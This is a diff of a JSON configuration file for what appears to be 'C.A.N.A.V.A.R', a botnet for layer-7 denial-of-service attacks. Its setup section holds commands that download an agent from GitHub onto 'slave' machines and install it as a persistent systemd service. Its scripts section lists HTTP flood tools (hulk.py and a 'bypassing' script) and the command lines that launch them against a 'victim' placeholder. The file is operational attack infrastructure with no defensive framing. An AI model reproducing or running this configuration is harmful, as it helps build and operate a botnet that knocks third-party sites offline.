@@ -1,13 +1,14 @@
 {
   "setup": {
-    "init": "sudo apt -y update; sudo apt -y upgrade ; sudo apt install wget; cd ~; curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh; sudo bash nodesource_setup.sh; sudo apt install nodejs -y; sudo apt install git -y; sudo apt install python-pip -y;",
-    "download_agent": "cd /; mkdir canavarl7; cd canavarl7; wget $AGENTLINK;",
+    "slaveNick": "canavarslave",
+    "serviceName": "canavarslave.service",
+    "undle": "sudo apt -y update; sudo apt -y upgrade ; sudo apt install wget; cd ~; curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh; sudo bash nodesource_setup.sh; sudo apt install nodejs -y; sudo apt install git -y; sudo apt install python-pip -y",
+    "service_setup": "cd /lib/systemd/system/; wget [serviceLink[ -O [serviceName[; systemctl daemon-reload; systemctl start [serviceName[; systemctl enable [serviceName[;",
+    "download_agent": "cd /; mkdir [slaveNick[; cd [slaveNick[; wget [agentLink[; mkdir scripts;",
     "download_modules": "npm install express fs axios events moment delay quick.db child_process",
-    "download_script": "cd /canavarl7/; mkdir -p scripts; cd /canavarl7/scripts/; wget $SCRIPTLINK -O $SCRIPTNAME;",
-    "service_setup": "cd /lib/systemd/system/; wget $SERVICELINK -O $SERVICENAME; systemctl daemon-reload; systemctl start $SERVICENAME; systemctl enable $SERVICENAME;",
+    "scriptdir": "/[slaveNick[/scripts/",
     "agentLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js",
-    "serviceLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/canavarl7.service",
-    "serviceName": "canavarl7.service"
+    "serviceLink": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/canavarl7.service"
   },
   "scripts": [
     {
@@ -16,7 +17,7 @@
       "lang": "python",
       "process": "python2",
       "filename": "hulk.py",
-      "dictation": "python2 /canavarl7/scripts/hulk.py $VICTIM",
+      "dictation": "python2 [scriptdir[hulk.py [victim[",
       "description": "Basic L7 Script, Recommended",
       "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/scripts/hulk.py"
     },
@@ -26,7 +27,7 @@
       "lang": "python",
       "process": "python2",
       "filename": "custommatter.py",
-      "dictation": "python2 /canavarl7/scripts/custommatter.py $VICTIM",
+      "dictation": "python2 [scriptdir[custommatter.py [victim[",
       "description": "Customized Bypassing-Method L7 Script",
       "source": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/scripts/custommatter.py"
     },
@@ -47,19 +48,20 @@
     "domainConnection": false
   },
   "global": {
-    "port": {
-      "number": 8973,
-      "changeAt": 1636745414000,
-      "changedLast": 1636844115426,
-      "changeTo": 8973,
-      "last": 8973
-    },
     "restart": {
       "scheduled": false,
       "at": null,
-      "last": 1636242889000
+      "last": null
     },
     "lockdown": true,
-    "accessKey": "foobar"
+    "allDynamicData": true,
+    "staticData": true,
+    "simpleHeartbeatDelay": 10000,
+    "complexHeartbeatDelay": 60000,
+    "refreshTimerDelay": 3600000,
+    "siDataPlacementDelay": 60000,
+    "dynDataPlacementDelay": 30000,
+    "maximumPortLife": 3600000,
+    "latestGlobalsDump": 1637281253378
   }
 }
